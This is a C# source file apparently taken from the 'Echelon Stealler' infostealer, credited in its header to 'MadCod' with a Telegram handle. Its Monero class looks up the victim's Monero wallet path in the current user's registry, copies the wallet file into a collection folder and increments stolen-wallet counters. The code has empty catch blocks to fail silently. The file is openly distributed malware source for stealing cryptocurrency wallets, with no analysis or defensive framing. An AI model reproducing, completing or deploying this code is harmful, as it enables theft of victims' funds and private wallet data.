///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using Microsoft.Win32;
using System.IO;

namespace Echelon
{
    class Monero
    {
        public static int count = 0;
        public static string base64xmr = "\\Wallets\\Monero\\";
        public static void XMRcoinStr(string directorypath) // Works

        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
                    try
                    {
                        Directory.CreateDirectory(directorypath + base64xmr);
                        string dir = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
                        Directory.CreateDirectory(directorypath + base64xmr);
                        File.Copy(dir, directorypath + base64xmr + dir.Split('\\')[dir.Split('\\').Length - 1]);
                        count++;
                        StartWallets.count++;

                    }
                    catch 
                    {
                    }
            }
            catch 
            {

            }

        }
    }
}
